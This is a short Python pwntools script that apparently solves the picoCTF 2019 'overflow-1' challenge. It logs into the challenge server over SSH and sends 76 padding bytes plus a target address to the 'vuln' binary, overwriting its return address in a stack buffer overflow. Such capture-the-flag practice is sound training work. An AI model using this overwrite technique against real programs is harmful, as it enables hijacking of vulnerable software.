from pwn import *
import os
import sys
sys.path.append(os.path.abspath("../../.."))
import credentials
import subprocess

sh = ssh(host='2019shell1.picoctf.com',
         user=credentials.username, password=credentials.password).run('sh')
sh.sendline(
    'cd /problems/overflow-1_5_c76a107db1438c97f349f6b2d98fd6f8')
sh.sendline('./vuln ')
input = [65] * 76
input[76:] = [0xe6, 0x85, 0x04, 0x08, ord('\n')]
sh.sendafter('Give me a string and lets see what happens:', bytes(input))
sh.interactive()
sh.close()
